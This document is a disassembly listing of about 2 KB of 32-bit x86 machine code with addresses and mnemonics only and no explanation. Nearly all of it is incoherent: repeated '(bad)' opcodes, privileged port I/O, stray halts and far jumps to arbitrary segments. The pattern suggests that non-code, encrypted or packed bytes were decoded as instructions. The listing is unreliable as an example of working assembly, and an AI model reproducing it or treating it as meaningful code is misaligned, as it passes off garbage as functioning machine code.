  4271d5:	stos   BYTE PTR es:[edi],al
  4271d6:	in     eax,dx
  4271d7:	(bad)  
  4271d8:	mov    ecx,0xcfb6e5ae
  4271dd:	icebp  
  4271de:	rol    DWORD PTR [ecx],cl
  4271e0:	call   0xc3ff59e3
  4271e5:	mov    eax,0xc0fafbe9
  4271eb:	leave  
  4271ec:	(bad)  
  4271ed:	dec    bl
  4271ef:	or     esp,ebx
  4271f1:	call   0xb20422c4
  4271f6:	repz in eax,dx
  4271f8:	cmc    
  4271f9:	in     al,0xc7
  4271fb:	mov    bh,0xd1
  4271fd:	jmp    0x4271f6
  4271ff:	in     al,dx
  427200:	(bad)  
  427201:	loop   0x4271c2
  427203:	sti    
  427204:	mov    esi,0xc4cae204
  427209:	loope  0x427205
  42720b:	aam    0x4
  42720d:	in     al,dx
  42720e:	dec    BYTE PTR [edx]
  427210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427211:	mov    eax,0xeec9afaf
  427216:	iret   
  427217:	leave  
  427218:	(bad)
  42721b:	out    dx,eax
  42721c:	mov    esi,0xe1f9ddd0
  427221:	aam    0xfa
  427223:	(bad)  
  427224:	in     eax,0xc4
  427226:	fadd   st,st(1)
  427228:	add    DWORD PTR [esi-0x1726f72b],edi
  42722e:	adc    ecx,DWORD PTR [edi]
  427230:	into   
  427231:	in     eax,dx
  427232:	jmp    0xe60a5a21
  427237:	int    0xe6
  427239:	out    0xeb,al
  42723b:	stc    
  42723c:	std    
  42723d:	cld    
  42723e:	aad    0xf1
  427240:	add    bh,bh
  427242:	add    eax,edi
  427244:	in     al,0xde
  427246:	(bad)  
  427248:	loop   0x42723e
  42724a:	not    dh
  42724c:	stc    
  42724d:	jmp    0x427230
  42724f:	or     eax,0xf7e6a8c5
  427254:	jecxz  0x427203
  427256:	hlt    
  427257:	iret   
  427258:	out    dx,al
  427259:	jmp    0xe3bc:0xf7ccb6fa
  427260:	(bad)  
  427262:	fcom   st(6)
  427264:	add    DWORD PTR [esi-0x7fd0a04],edi
  42726a:	jmp    0x427234
  42726c:	(bad)  
  42726d:	fcomip st,st(2)
  42726f:	cli    
  427270:	mov    eax,0xc4cbcbc5
  427275:	lods   al,BYTE PTR ds:[esi]
  427276:	ret    0xf1fa
  427279:	repnz repnz shl BYTE PTR [ebp+ebp*8-0x2c170408],cl
  427282:	sti    
  427283:	fld    st(1)
  427285:	repz out 0xa,eax
  427288:	add    edi,eax
  42728a:	pop    es
  42728b:	leave  
  42728c:	in     eax,dx
  42728d:	iret   
  42728e:	int3   
  42728f:	shl    BYTE PTR [ecx-0x361a2d19],cl
  427295:	icebp  
  427296:	jmp    0x427280
  427298:	out    dx,al
  427299:	mov    bh,0xeb
  42729b:	lds    edi,FWORD PTR [ebx-0x1072409]
  4272a1:	(bad)  
  4272a3:	(bad)  
  4272a4:	std    
  4272a5:	add    al,0xd4
  4272a7:	idiv   dh
  4272a9:	aad    0xea
  4272ab:	add    eax,0xdac4e80d
  4272b0:	ret    
  4272b1:	retf   0xacf2
  4272b4:	retf   0xbbdb
  4272b7:	icebp  
  4272b8:	out    dx,al
  4272b9:	out    0xe8,eax
  4272bb:	cli    
  4272bc:	aad    0xcf
  4272be:	(bad)  [esi+ebx*8+0x2d1bce8]
  4272c5:	or     esp,ebp
  4272c7:	retf   
  4272c8:	add    al,0xc9
  4272ca:	jmp    0xcfcf:0xe3effee9
  4272d1:	out    0xbf,al
  4272d3:	loope  0x4272c5
  4272d5:	icebp  
  4272d6:	repz out dx,al
  4272d8:	shr    eax,cl
  4272da:	out    0xce,eax
  4272dc:	out    dx,al
  4272dd:	(bad)  
  4272de:	call   0xd4236dab
  4272e3:	shl    bh,1
  4272e5:	mov    esp,0xc5ebfad4
  4272ea:	or     bl,ch
  4272ec:	retf   0xe0e
  4272ef:	ffreep st(4)
  4272f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4272f2:	loope  0x4272db
  4272f4:	imul   ebp
  4272f6:	rcl    bl,cl
  4272f8:	jmp    0xedcb:0xf3ecffd4
  4272ff:	mov    esi,0xe3d8f4cc
  427304:	cld    
  427305:	rcl    esi,0xb8
  427308:	retf   
  427309:	std    
  42730a:	add    bl,bl
  42730c:	bswap  edx
  42730e:	enter  0xe7e2,0xf3
  427312:	ror    esi,0xd2
  427315:	leave  
  427316:	in     eax,0xeb
  427318:	in     eax,dx
  427319:	mov    cl,0xce
  42731b:	jmp    0xe01a44e8
  427320:	out    dx,eax
  427321:	fdivr  st(7),st
  427323:	(bad)  
  427324:	hlt    
  427325:	fpatan 
  427327:	add    dh,cl
  427329:	call   0xf95160f4
  42732e:	loope  0x427342
  427330:	out    dx,eax
  427331:	in     eax,0xea
  427333:	icebp  
  427334:	cmc    
  427335:	lods   eax,DWORD PTR ds:[esi]
  427336:	mov    ah,0xd7
  427339:	fpatan 
  42733b:	fcomp  st(5)
  42733d:	test   ah,0xfd
  427340:	not    dh
  427342:	mov    esp,0xf9d1daf3
  427347:	jmp    0xdfdc:0xceeec1d9
  42734e:	int    0x12
  427350:	les    ebp,FWORD PTR [esi-0x3b2c323f]
  427356:	shr    dh,cl
  427358:	rcl    esp,1
  42735a:	sti    
  42735b:	jmp    0xe1db:0xccdef8d7
  427362:	loopne 0x427340
  427364:	repz int3 
  427366:	xlat   BYTE PTR ds:[ebx]
  427367:	frndint 
  427369:	loopne 0x427353
  42736b:	or     ch,bl
  42736d:	fmul   QWORD PTR [esi]
  42736f:	add    al,0xe3
  427371:	mov    eax,0xf5afe1cb
  427376:	mov    al,0xe7
  427378:	stc    
  427379:	(bad)  
  42737a:	mov    ebx,0xf5d7ecac
  42737f:	sar    DWORD PTR [esi-0x20384604],1
  427385:	fdiv   st(3),st
  427387:	aad    0xe4
  427389:	sti    
  42738a:	pop    es
  42738b:	(bad)  
  42738c:	add    ah,dl
  42738e:	fild   WORD PTR [ecx]
  427390:	mov    bl,0xee
  427392:	not    esi
  427394:	int3   
  427395:	loopne 0x427352
  427397:	mov    ebx,0xfbc5edc1
  42739c:	mov    esi,0xdcf1cee3
  4273a1:	xlat   BYTE PTR ds:[ebx]
  4273a2:	(bad)  
  4273a3:	sar    DWORD PTR [esi-0x3e202b2c],1
  4273a9:	loopne 0x427385
  4273ab:	(bad)  
  4273ac:	dec    ch
  4273ae:	add    DWORD PTR [esi],ecx
  4273b0:	ret    0xcbbe
  4273b3:	fnstsw WORD PTR [ecx+eax*8-0x3a173017]
  4273ba:	(bad)
  4273bd:	fsubp  st(5),st
  4273bf:	jmp    0xf43c529b
  4273c4:	cli    
  4273c5:	add    al,0xd8
  4273c7:	in     eax,0xfb
  4273c9:	rol    DWORD PTR [esi],0xe7
  4273cc:	aad    0xcd
  4273ce:	push   cs
  4273cf:	in     eax,0xcd
  4273d1:	mov    bl,0xbd
  4273d3:	fnsave [ecx-0x1f3a104a]
  4273d9:	call   0xf42040a3
  4273de:	mov    ebx,0xd1cce3f1
  4273e3:	fdiv   st(6),st
  4273e5:	xlat   BYTE PTR ds:[ebx]
  4273e6:	add    edx,ebp
  4273e8:	loop   0x4273e0
  4273ea:	out    0x7,al
  4273ec:	add    al,0xfd
  4273ee:	out    0xcf,al
  4273f0:	in     eax,0xee
  4273f2:	lods   al,BYTE PTR ds:[esi]
  4273f3:	mov    bh,0xca
  4273f5:	mov    esp,0xb1f9f7f7
  4273fa:	dec    dh
  4273fc:	(bad)  
  4273fe:	loop   0x4273c2
  427400:	sar    DWORD PTR [edx-0x26f9fd00],1
  427406:	add    dl,al
  427408:	or     al,dh
  42740a:	(bad)  
  42740c:	(bad)  
  42740d:	aam    0xdc
  42740f:	(bad)  
  427410:	mov    esp,0xc4e5f7c7
  427415:	mov    dh,0xf1
  427417:	cmc    
  427418:	mov    dh,0xe7
  42741a:	retf   0xdcf7
  42741d:	ror    esi,1
  42741f:	lock shl ecx,0xfb
  427423:	push   es
  427424:	add    al,0xfe
  427426:	fdivr  st(6),st
  427428:	leave  
  427429:	sti    
  42742a:	(bad)  
  42742c:	or     al,0xc8
  42742e:	fadd   QWORD PTR [esi]
  427430:	in     eax,dx
  427431:	fsubp  st(6),st
  427433:	into   
  427434:	mov    edx,0xb2cff6d3
  42743a:	mov    bh,0xe9
  42743c:	rcl    edi,1
  42743e:	in     eax,dx
  42743f:	jecxz  0x427413
  427441:	mov    esp,0xd6d8e6ce
  427446:	mov    ecx,0xdedddbe9
  42744b:	pop    es
  42744c:	in     eax,dx
  42744d:	in     eax,dx
  42744e:	enter  0xdfdd,0xc7
  427452:	scas   eax,DWORD PTR es:[edi]
  427453:	out    dx,eax
  427454:	jmp    0x427439
  427456:	into   
  427457:	mov    dh,0xd1
  427459:	int    0xf3
  42745b:	(bad)  
  42745c:	out    dx,al
  42745d:	fdivp  st(0),st
  42745f:	iret   
  427460:	call   0xbd343855
  427465:	sar    DWORD PTR [ebp-0x35ff0748],0xdc
  42746c:	add    al,0xf
  42746e:	jmp    0xd1c7:0xd2c0a806
  427475:	icebp  
  427476:	ret    0xc8ce
  427479:	shl    esp,cl
  42747b:	sti    
  42747c:	into   
  42747d:	fdiv   st,st(5)
  42747f:	fdiv   st(2),st
  427481:	rcr    eax,1
  427483:	std    
  427484:	fneni(8087 only) 
  427486:	repnz add al,ah
  427489:	loop   0x42744c
  42748b:	add    BYTE PTR [edx],al
  42748d:	dec    edi
  42748f:	iret   
  427490:	scas   al,BYTE PTR es:[edi]
  427491:	imul   DWORD PTR [edi-0x491d2222]
  427497:	retf   
  427498:	int3   
  427499:	mov    ch,0xf9
  42749b:	neg    esp
  42749d:	repnz out dx,eax
  42749f:	test   esi,0xfdfddbcc
  4274a5:	rol    BYTE PTR [edx],1
  4274a7:	loope  0x427473
  4274a9:	jmp    0xd800:0xf3dac8c7
  4274b0:	retf   0xeabf
  4274b3:	lock retf 
  4274b5:	retf   
  4274b6:	(bad)  
  4274b7:	in     al,0xf7
  4274b9:	retf   0xebee
  4274bc:	mov    esi,0xcdb4c9d1
  4274c1:	stc    
  4274c2:	loopne 0x4274ab
  4274c4:	add    bl,cl
  4274c6:	fcmovnb st,st(5)
  4274c8:	inc    ebp
  4274ca:	mul    ebx
  4274cc:	stc    
  4274cd:	(bad)  
  4274cf:	int3   
  4274d0:	in     eax,dx
  4274d1:	ffreep st(2)
  4274d3:	loop   0x4274cb
  4274d5:	lock jmp 0x4274b8
  4274d8:	out    dx,eax
  4274d9:	lock iret 
  4274db:	out    dx,eax
  4274dc:	shl    BYTE PTR [ebp-0x5ff1313],1
  4274e2:	add    BYTE PTR [esp+edx*8+0xf5e6ec],dh
  4274e9:	mov    esi,0xdbe905ca
  4274ee:	(bad)  
  4274f0:	ret    
  4274f1:	call   0xaf2841da
  4274f6:	mov    ebx,0xc7c0efc6
  4274fb:	mov    eax,0xbfb8ccfc
  427500:	mov    eax,0xc6fffcbd
  427505:	or     edi,DWORD PTR [esi+esi*8-0x1226fb35]
  42750c:	push   cs
  42750d:	out    0xcc,eax
  42750f:	add    ch,BYTE PTR [ebx-0xc220929]
  427515:	shl    ebp,cl
  427517:	cmc    
  427518:	mov    ecx,0xc4f2cff3
  42751d:	mov    ah,0xd5
  42751f:	mov    ecx,0xf4ceecef
  427524:	sti    
  427525:	cli    
  427526:	xlat   BYTE PTR ds:[ebx]
  427527:	jmp    0xed0a:0xc7e0fcdb
  42752e:	loope  0x42750a
  427530:	ret    0xc3f0
  427533:	out    0xd7,eax
  427535:	mov    dh,0xe3
  427537:	jmp    0xd5f8360e
  42753c:	test   ch,0xf3
  42753f:	(bad)  
  427540:	fsubr  st(7),st
  427542:	stc    
  427543:	mov    ebp,0xd8f5c2e4
  427548:	lock ffreep st(7)
  42754b:	cld    
  42754c:	out    0xc2,al
  42754e:	loopne 0x42754a
  427550:	mov    ecx,0xabeee9b8
  427555:	(bad)  
  427556:	out    0xe5,eax
  427558:	les    esi,FWORD PTR [edx-0xd3b222d]
  42755e:	mov    ecx,0xd801d6b4
  427563:	icebp  
  427564:	clc    
  427565:	(bad)
  427568:	add    eax,0xcae7ebe0
  42756d:	loope  0x42757c
  42756f:	or     bl,dh
  427571:	jmp    0xd1c6:0xeaf4d5e4
  427578:	int3   
  427579:	rcr    ecx,cl
  42757b:	sti    
  42757c:	(bad)  
  42757d:	aad    0xf7
  42757f:	ret    
  427580:	(bad)  
  427582:	cli    
  427583:	fsubr  st(7),st
  427585:	hlt    
  427586:	(bad)  
  427588:	jmp    0x42755f
  42758a:	out    dx,al
  42758b:	in     eax,dx
  42758c:	add    al,0xdc
  42758e:	add    eax,0xe0e4d80e
  427593:	repz mov dh,0xdc
  427596:	shl    cl,0xdb
  427599:	in     eax,0xba
  42759b:	sar    dl,1
  42759d:	sti    
  42759e:	repz shr esp,1
  4275a1:	mov    eax,0xc2c0f6f3
  4275a6:	fmulp  st(2),st
  4275a8:	test   dl,0xe0
  4275ab:	add    eax,0xebfe0bef
  4275b0:	repnz scas al,BYTE PTR es:[edi]
  4275b2:	leave  
  4275b3:	scas   al,BYTE PTR es:[edi]
  4275b4:	retf   0xfbd5
  4275b7:	(bad)  
  4275b9:	call   0xdd3b2cb6
  4275be:	aam    0xde
  4275c0:	loope  0x427583
  4275c2:	mov    ecx,0xfbd9fef2
  4275c7:	(bad)  
  4275c9:	fdivr  QWORD PTR [ebp-0x2505051c]
  4275cf:	add    al,0xb1
  4275d1:	retf   0xf1ef
  4275d4:	shl    ch,1
  4275d6:	jecxz  0x4275ce
  4275d8:	mov    ebx,0xf7fef3ff
  4275dd:	mov    ah,0xf0
  4275df:	fucom  st(3)
  4275e1:	ret    
  4275e2:	mov    edi,0xbcfac1de
  4275e7:	fsub   st,st(1)
  4275e9:	jecxz  0x4275b1
  4275eb:	loopne 0x4275c1
  4275ed:	or     esp,eax
  4275ef:	shr    BYTE PTR [eax-0x2c3a151e],cl
  4275f5:	div    BYTE PTR [esp+edx*8-0x49283f36]
  4275fc:	test   eax,0xbce2ccc3
  427602:	int3   
  427603:	inc    BYTE PTR ds:0xc6d5f4fd
  427609:	fucomp st(3)
  42760b:	jmp    0xe2f0:0x1300edda
  427612:	jecxz  0x4275c3
  427614:	aam    0xcd
  427616:	lods   al,BYTE PTR ds:[esi]
  427617:	int3   
  427618:	mov    ebx,0xf4fbb4e6
  42761d:	hlt    
  42761e:	out    dx,eax
  42761f:	fld1   
  427621:	int3   
  427622:	mov    ch,0xda
  427624:	mov    edi,0xe0d8e6f6
  427629:	add    esp,ebx
  42762b:	fadd   DWORD PTR [ebx]
  42762d:	sti    
  42762e:	clc    
  42762f:	or     eax,0xf6a8f1ca
  427634:	int3   
  427635:	in     eax,dx
  427636:	enter  0xe7ca,0xb2
  42763a:	mov    ah,0xc6
  42763c:	fcmove st,st(2)
  42763e:	fcmovnu st,st(1)
  427640:	cmc    
  427641:	loop   0x42762f
  427643:	loopne 0x427641
  427645:	fcmovnbe st,st(0)
  427647:	rcl    al,cl
  427649:	in     eax,0xc5
  42764b:	add    bh,ch
  42764d:	psubsb mm0,QWORD PTR [edx]
  427650:	(bad)  
  427652:	in     eax,0xc6
  427654:	ret    
  427655:	(bad)  
  427656:	out    dx,eax
  427657:	in     eax,0xda
  427659:	rcr    bh,1
  42765b:	mov    edi,0xbaebdef2
  427660:	add    bl,bh
  427662:	(bad)  
  427663:	into   
  427664:	rol    DWORD PTR [ebx],cl
  427666:	jmp    0xd404:0xdcf7f609
  42766d:	fsubr  st(0),st
  42766f:	adc    ah,bl
  427671:	jmp    0xf01f2960
  427676:	loopne 0x427646
  427678:	mov    dh,0xea
  42767a:	xlat   BYTE PTR ds:[ebx]
  42767b:	imul   edi
  42767d:	repz mov cl,0xbf
  427680:	add    ebx,esi
  427682:	mov    eax,0xf9ebc500
  427687:	ror    bl,cl
  427689:	(bad)
  42768c:	ret    
  42768d:	loopne 0x427682
  42768f:	dec    edx
  427691:	out    dx,al
  427692:	leave  
  427693:	mov    bh,0xab
  427695:	shl    bl,1
  427697:	mov    dl,0xdb
  427699:	lock aad 0xef
  42769c:	mov    bh,0xfd
  42769e:	in     al,dx
  42769f:	out    dx,al
  4276a0:	iret   
  4276a1:	int3   
  4276a2:	(bad)  
  4276a3:	idiv   BYTE PTR [edi-0x2109183a]
  4276a9:	stc    
  4276aa:	fild   WORD PTR [edx]
  4276ac:	enter  0xe5e9,0xe9
  4276b0:	mov    bl,0xac
  4276b2:	loop   0x427690
  4276b4:	int    0xb3
  4276b6:	xlat   BYTE PTR ds:[ebx]
  4276b7:	lods   al,BYTE PTR ds:[esi]
  4276b8:	out    0xcb,al
  4276ba:	enter  0xb9b8,0xb9
  4276be:	jmp    0x42768e
  4276c0:	loope  0x4276b2
  4276c2:	icebp  
  4276c3:	ret    
  4276c4:	jmp    edi
  4276c6:	repnz cmc 
  4276c8:	(bad)  
  4276c9:	dec    BYTE PTR [edx]
  4276cb:	push   es
  4276cc:	in     eax,0xfc
  4276ce:	repz (bad)
  4276d1:	fidiv  WORD PTR [ecx-0x144a1c5c]
  4276d7:	iret   
  4276d8:	(bad)  
  4276d9:	aam    0xc4
  4276db:	(bad)
  4276de:	retf   
  4276df:	stc    
  4276e0:	mov    bh,0xde
  4276e2:	fdivrp st(5),st
  4276e4:	rol    BYTE PTR [ecx],cl
  4276e6:	hlt    
  4276e7:	push   es
  4276e8:	or     bl,ah
  4276ea:	xlat   BYTE PTR ds:[ebx]
  4276eb:	stc    
  4276ec:	or     al,0xc9
  4276ee:	in     al,dx
  4276ef:	icebp  
  4276f0:	mov    bl,0xbc
  4276f2:	rcl    edi,cl
  4276f4:	iret   
  4276f5:	(bad)  
  4276f6:	int    0xf7
  4276f8:	jmp    0xddf8:0xeac9dfd3
  4276ff:	clc    
  427700:	sti    
  427701:	fadd   st,st(7)
  427703:	pop    es
  427704:	rol    BYTE PTR [edi*4+0x5dfd5db],cl
  42770b:	in     eax,0xd5
  42770d:	enter  0xce0,0xe9
  427711:	shr    dl,1
  427713:	mov    bh,0xcc
  427715:	in     eax,dx
  427716:	(bad)  
  427717:	in     al,0xe6
  427719:	enter  0xd7ad,0xfc
  42771d:	mov    ebx,0xcce8b4e3
  427722:	fnstsw ax
  427724:	lock rol ecx,cl
  427727:	jmp    0x1fa:0xd90affd9
  42772e:	or     esi,ebx
  427730:	shl    cl,1
  427732:	out    0xcf,eax
  427734:	xlat   BYTE PTR ds:[ebx]
  427735:	mov    dh,0xcd
  427737:	rcl    cl,cl
  427739:	aad    0xdb
  42773b:	mov    ch,0xea
  42773d:	jecxz  0x4276f8
  42773f:	mov    esi,0xc703d2dd
  427744:	in     al,dx
  427745:	add    ebx,ebp
  427747:	or     edx,esi
  427749:	out    0xe8,al
  42774b:	add    cl,al
  42774d:	out    dx,al
  42774e:	retf   0xc7cf
  427751:	(bad)
  427755:	repz (bad) 
  427757:	in     al,0xe7
  427759:	mov    bh,0xce
  42775b:	fstp   TBYTE PTR [ecx-0x2c311725]
  427761:	mov    esi,0xf9d7fdff
  427766:	fdivr  st,st(4)
  427768:	pop    es
  427769:	loop   0x427766
  42776b:	mov    esp,0xd03cfd4
  427770:	jmp    0x427759
  427772:	in     al,0xc9
  427774:	in     al,dx
  427775:	shl    cl,0xf2
  427778:	mov    dh,0xe8
  42777a:	int    0xdd
  42777c:	clc    
  42777d:	leave  
  42777e:	jmp    0xf6fa:0xf7e2e3df
  427785:	shl    dh,0x9
  427788:	loopne 0x42777f
  42778a:	in     al,0x3
  42778c:	jecxz  0x427766
  42778e:	in     eax,0xe7
  427790:	test   eax,0xeeadc6b1
  427795:	call   0xba0a248b
  42779a:	out    dx,eax
  42779b:	cmc    
  42779c:	in     al,dx
  42779d:	out    dx,al
  42779e:	call   0xdc43335c
  4277a3:	cld    
  4277a4:	cld    
  4277a5:	push   es
  4277a6:	add    al,0xe2
  4277a8:	(bad)  [edx]
  4277aa:	jmp    0xcb0e:0xf3e3e2db
  4277b1:	scas   eax,DWORD PTR es:[edi]
  4277b2:	ret    
  4277b3:	mov    esp,0xfad3b4ec
  4277b8:	icebp  
  4277b9:	mov    dl,0xdb
  4277bb:	into   
  4277bc:	in     al,dx
  4277bd:	fcmove st,st(4)
  4277bf:	cld    
  4277c0:	rcl    cl,1
  4277c2:	out    0xf5,al
  4277c4:	clc    
  4277c5:	xlat   BYTE PTR ds:[ebx]
  4277c6:	loop   0x4277aa
  4277c8:	push   es
  4277c9:	out    dx,eax
  4277ca:	out    dx,eax
  4277cb:	(bad)  
  4277cc:	in     al,dx
  4277cd:	in     al,dx
  4277ce:	jmp    0xcc333de6
  4277d3:	lock stos DWORD PTR es:[edi],eax
  4277d5:	into   
  4277d6:	jmp    0xcdfb49c4
  4277db:	mov    ecx,0xc3bfcae5
  4277e0:	int    0xf9
  4277e2:	sti    
  4277e3:	out    0xdd,eax
  4277e5:	(bad)  
  4277e6:	ror    edx,1
  4277e8:	jmp    0x1973f3
  4277ed:	fdivp  st(1),st
  4277ef:	or     eax,0xf6d7c5f3
  4277f4:	enter  0xe6f5,0xd7
  4277f8:	(bad)  
  4277f9:	hlt    
  4277fa:	cli    
  4277fb:	clc    
  4277fc:	jmp    0x4277bd
  4277fe:	out    dx,eax
  4277ff:	mov    edi,0xbfb5daf4
  427804:	test   ah,0x1
  427807:	fcos   
  427809:	pop    es
  42780a:	jmp    0x427809
  42780c:	lds    eax,FWORD PTR ds:0xe4e90efa
  427812:	shr    ah,cl
  427814:	repnz int3 
  427816:	in     al,dx
  427817:	lds    edi,FWORD PTR [ebx-0x2c2f2d06]
  42781d:	hlt    
  42781e:	mov    eax,0xfdd1e9f4
  427823:	jecxz  0x427806
  427825:	add    eax,eax
  427827:	cld    
  427828:	loop   0x42782d
  42782a:	jmp    0xd306:0xce204e8
  427831:	icebp  
  427832:	mov    bh,0xbe
  427834:	jmp    0x427804
  427836:	mov    ah,0xd9
  427838:	mov    ebx,0xc9eaebed
  42783d:	repnz rcl bh,cl
  427840:	loope  0x427838
  427842:	rcr    dh,cl
  427844:	div    eax
  427846:	add    ebx,esi
  427848:	push   es
  427849:	retf   
  42784a:	add    eax,0xfc09ca01
  42784f:	loope  0x427831
  427851:	shl    esp,1
  427853:	(bad)  
  427854:	cmc    
  427855:	loope  0x42780c
  427857:	in     al,0xc8
  427859:	lds    edi,FWORD PTR [edi-0x2f2f0d1a]
  42785f:	sti    
  427860:	rcr    edx,1
  427862:	(bad)  
  427863:	shr    ah,cl
  427865:	(bad)  
  427866:	hlt    
  427867:	fcmovnu st,st(7)
  427869:	cmpxchg8b (bad)
  42786a:	(bad)  
  42786b:	retf   
  42786c:	jmp    0xf2277b49
  427871:	in     eax,dx
  427872:	out    0xd6,al
  427874:	mov    al,0xce
  427876:	leave  
  427877:	rol    al,0xae
  42787a:	out    0xcd,al
  42787c:	not    ecx
  42787e:	repnz mov edi,0xffb9cfe9
  427884:	(bad)  
  427885:	cld    
  427886:	clc    
  427887:	clc    
  427888:	(bad)
  42788c:	jmp    0xe3bc:0xd9cb070a
  427893:	shl    esp,0xc3
  427896:	fstp   TBYTE PTR [ebx-0x45311b11]
  42789c:	out    dx,eax
  42789d:	jmp    0x427896
  42789f:	add    dl,al
  4278a1:	mov    ecx,0xe005d3db
  4278a6:	cmc    
  4278a7:	pop    es
  4278a8:	out    0xb,eax
  4278aa:	in     al,0xfe
  4278ac:	int    0xf9
  4278ae:	fyl2x  
  4278b0:	mov    ecx,0xe7d7f2ee
  4278b5:	loopne 0x42786d
  4278b7:	out    dx,al
  4278b8:	jmp    0xb4f37478
  4278bd:	mov    esi,0xc3c3dedf
  4278c2:	fdivrp st(4),st
  4278c4:	int    0xd2
  4278c6:	(bad)  
  4278c7:	fisttp QWORD PTR [ecx]
  4278c9:	add    al,0xfd
  4278cb:	loop   0x4278ce
  4278cd:	dec    DWORD PTR [edx]
  4278cf:	pop    es
  4278d0:	jecxz  0x4278bc
  4278d2:	(bad)  
  4278d3:	loop   0x4278c4
  4278d5:	loopne 0x427897
  4278d7:	int    0xb3
  4278d9:	loopne 0x4278ba
  4278db:	mov    ah,0xd6
  4278dd:	jmp    0xc206:0x3d6f4dd
  4278e4:	mul    al
  4278e6:	loope  0x4278b9
  4278e8:	retf   0xbf9
  4278eb:	or     ebp,eax
  4278ed:	push   cs
  4278ee:	retf   0xeaf2
  4278f1:	stos   BYTE PTR es:[edi],al
  4278f2:	ret    0xcedd
  4278f5:	out    0xda,al
  4278f7:	repz loope 0x4278d4
  4278fa:	xlat   BYTE PTR ds:[ebx]
  4278fb:	mov    ecx,0xe2fabcf3
  427900:	mov    esp,0xdfffb9d2
  427905:	fld    st(1)
  427907:	cli    
  427908:	rol    DWORD PTR [eax],0xe9
  42790b:	(bad)  
  42790d:	vpsubsb xmm2,xmm0,xmm3
  427911:	fidiv  WORD PTR [edi-0x2b245023]
  427917:	cmc    
  427918:	into   
  427919:	into   
  42791a:	out    0xe4,al
  42791c:	(bad)  
  42791e:	rcl    esi,cl
  427920:	(bad)  
  427922:	cld    
  427923:	sar    dl,0xdf
  427926:	loopne 0x4278fa
  427928:	stc    
  427929:	fdiv   st,st(6)
  42792b:	fucomi st,st(4)
  42792d:	or     al,0xc4
  42792f:	retf   
  427930:	fcomip st,st(2)
  427932:	ret    0xabe3
  427935:	sti    
  427936:	(bad)  
  427937:	sti    
  427938:	retf   
  427939:	ror    ch,0xf8
  42793c:	aad    0xcd
  42793e:	repnz mov ebx,0xfdb8b9dc
  427944:	fdivr  DWORD PTR [ebx+ecx*1-0x37f6f906]
  42794b:	in     eax,dx
  42794c:	aam    0xe3
  42794e:	jmp    0xe62a3d51
  427953:	scas   al,BYTE PTR es:[edi]
  427954:	vpinsrw xmm2,xmm3,ebx,0xed
  427959:	int3   
  42795a:	repnz mov dh,0xf6
  42795d:	clc    
  42795e:	icebp  
  42795f:	jmp    eax
  427961:	out    dx,al
  427962:	rol    BYTE PTR ds:0xd2ddc6fc,1
  427968:	add    al,0xd8
  42796a:	iret   
  42796b:	retf   0xedb
  42796e:	loop   0x42796c
  427970:	mov    esi,0xc6c9cee3
  427975:	into   
  427976:	retf   0xf5e7
  427979:	in     al,dx
  42797a:	fld    st(4)
  42797c:	cld    
  42797d:	mov    dl,0xd7
  42797f:	jecxz  0x427973
  427981:	(bad)  
  427983:	add    bh,BYTE PTR [esi+0x4e2e7fc]
  427989:	(bad)  
  42798a:	fcmovb st,st(0)
  42798c:	fisttp QWORD PTR ds:0xdddecddc
  427992:	jmp    0x427957
  427994:	aam    0xe3
  427996:	ret    
  427997:	mov    cl,0xb5
  427999:	repnz sar bh,cl
  42799c:	(bad)  
  42799d:	xlat   BYTE PTR ds:[ebx]
  42799e:	int3   
  42799f:	mov    edx,0xe1c3d2d7
  4279a4:	sar    dh,cl
  4279a6:	shl    al,0xc3
  4279a9:	(bad)  
  4279ab:	(bad)  
  4279ac:	leave  
  4279ad:	fcmovu st,st(0)
  4279af:	loope  0x427971
  4279b1:	into   
  4279b2:	repz scas al,BYTE PTR es:[edi]
  4279b4:	shl    eax,cl
  4279b6:	ret    
  4279b7:	mov    bh,0xc0
  4279b9:	icebp  
  4279ba:	leave  
  4279bb:	out    dx,al
  4279bc:	in     al,0xd6
  4279be:	add    cl,bh
  4279c0:	cli    
  4279c1:	add    dh,ch
  4279c3:	aam    0xd5
  4279c5:	add    esp,ebx
  4279c7:	icebp  
  4279c8:	(bad)  
  4279c9:	loopne 0x42798f
  4279cb:	add    ebx,eax
  4279cd:	or     eax,0xddb9dd13
  4279d2:	mov    esp,0xecbcf0f0
  4279d7:	mov    al,0xd7
  4279d9:	stc    
  4279da:	out    0xf1,al
  4279dc:	icebp  
  4279dd:	xlat   BYTE PTR ds:[ebx]
  4279de:	(bad)  
  4279df:	add    edi,ebx
  4279e1:	mov    edi,0xd6d103dd
  4279e6:	mov    esp,0xc1c0e1c5
  4279eb:	fisttp QWORD PTR [edi]
  4279ed:	fcmovnb st,st(5)
  4279ef:	add    DWORD PTR [edi-0xe5b520f],edi
  4279f5:	rol    ecx,0xc8
  4279f8:	loope  0x4279e5
  4279fa:	hlt    
  4279fb:	retf   0xf3e9
  4279fe:	call   0xd61a67d4
  427a03:	rcl    ebp,cl
  427a05:	in     al,dx
  427a06:	out    0x2,al
  427a08:	loope  0x4279d2
  427a0a:	sti    
  427a0b:	paddw  mm3,mm7
  427a0e:	loopne 0x427a14
  427a10:	mov    eax,0xefdcddad
  427a15:	lods   eax,DWORD PTR ds:[esi]
  427a16:	repnz test al,0xed
  427a19:	jmp    0xd8bd:0xf2cdd8ba
  427a20:	ret    0xb5bc
  427a23:	test   DWORD PTR [edi],0xda0bfcdd
  427a29:	jmp    0x80588f9
  427a2e:	int    0xdf
  427a30:	lock repz in al,0xe5
  427a34:	aam    0xf1
  427a36:	mov    al,0xf2
  427a38:	mov    bh,0xe7
  427a3a:	fcmove st,st(7)
  427a3c:	jmp    0xcfe2:0xbac8d5db
  427a43:	cli    
  427a44:	ffreep st(2)
  427a46:	mov    esp,0x8e1f8e9
  427a4b:	stc    
  427a4c:	clc    
  427a4d:	in     eax,0xfc
  427a4f:	(bad)
  427a53:	enter  0xb2d4,0xb3
  427a57:	retf   
  427a58:	mov    al,0xdb
  427a5b:	jmp    0x427a2a
  427a5d:	mov    dl,0xff
  427a5f:	fcomp  st(3)
  427a61:	stc    
  427a62:	mov    edi,0xc7fabcff
  427a67:	(bad)  
  427a68:	jmp    0xf8ff6552
  427a6d:	out    0xcc,eax
  427a6f:	cld    
  427a70:	faddp  st(4),st
  427a72:	test   al,0xcf
  427a74:	mov    ch,0xef
  427a76:	in     eax,dx
  427a77:	icebp  
  427a78:	shl    BYTE PTR [esi-0x10010c35],1
  427a7e:	int    0xd4
  427a80:	aam    0xce
  427a82:	add    dh,ch
